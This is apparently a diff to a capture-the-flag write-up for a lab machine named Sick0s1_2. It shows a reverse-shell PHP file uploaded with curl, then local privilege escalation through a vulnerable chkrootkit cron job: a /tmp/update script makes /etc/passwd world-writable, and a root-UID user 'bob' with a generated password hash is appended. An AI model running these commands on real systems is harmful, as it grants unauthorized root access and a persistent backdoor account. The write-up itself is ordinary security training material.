@@ -55,3 +55,47 @@ curl --upload-file rev.php -v -url http://192.168.100.10/test/
 
 ## Enumeration
 
+While Enumerating, I found the chkrootkit in cron daily jobs and when I check its version I got the [exploit](https://www.exploit-db.com/exploits/33899) for it on exploit-db, now I will follow the steps that are on exploit-db.
+
+```bash
+
+cd /tmp
+
+echo "chmod 777 /etc/passwd" > update
+# adding the content into update file to give full access of /etc/passwd file to all users 
+
+chmod 777 update
+# To make the update file executable
+
+# After some minutes, we will can see that the permissions of /etc/passwd has changed.
+
+www-data@ubuntu:/tmp$ ls -alh /etc/passwd
+-rwxrwxrwx 1 root root 953 Apr 12  2016 /etc/passwd
+
+```
+
+Now we need to append out user with password and root Privileges 
+
+```bash
+
+┌──(kali㉿kali)-[~/Desktop/Machines_WriteUps/Sick0s1_2]
+└─$ sudo openssl passwd -6 --salt furkan 123456
+[sudo] password for kali: 
+$6$furkan$Rz7O5q5PRbGnyQb.umIQKjXwE2v2U1LZWYbooA3xnJ4ZQiRpuy1g4mCSK/6pFsPdjMBNkuXU2iEJoEoSUqx.0.
+
+# For generating the hash password for our user
+```
+
+```bash
+echo 'bob:$6$furkan$Rz7O5q5PRbGnyQb.umIQKjXwE2v2U1LZWYbooA3xnJ4ZQiRpuy1g4mCSK/6pFsPdjMBNkuXU2iEJoEoSUqx.0.:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Appending our user `bob` with root Privileges
+```
+
+### Privilege Escalation
+
+Lets, try logging in as bob
+
+![flag](screenshots/flag.png)
+
+## Here I got root access, and  the flag🚩 
